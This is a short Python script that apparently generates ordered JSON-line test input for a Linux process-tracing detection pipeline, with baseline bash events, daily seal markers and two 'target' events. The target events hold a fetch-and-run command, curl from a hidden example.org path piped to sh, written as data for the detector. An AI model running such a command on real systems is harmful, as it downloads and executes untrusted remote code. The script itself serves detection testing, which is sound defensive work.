#!/usr/bin/env python3
"""Generate a small ordered input fixture. Does not contact Kafka or ES."""
import json,sys,datetime
family='tracing_sas_linux'
def emit(x):print(json.dumps(x))
for day in range(5,10):
 d=f'2026-06-{day:02}'
 emit({'index_family':family,'event_id':f'base-{day}','payload':{'@timestamp':d+'T10:00:00+08:00','host_ip':'10.0.0.1','username':'root','proc_name':'bash','cmdline':'bash /usr/bin/normal'}})
 emit({'index_family':family,'kind':'SEAL','day':d})
for i in range(2):
 emit({'index_family':family,'event_id':f'target-{i}','payload':{'@timestamp':f'2026-06-10T12:00:0{i}+08:00','host_ip':'10.0.0.2','username':'root','proc_name':'curl','cmdline':'curl http://example.org/.hidden/a | sh','cmd_chain':'["curl http://example.org/a", "/bin/bash /usr/bin/custom"]'}})
emit({'index_family':family,'kind':'SEAL','day':'2026-06-10'})
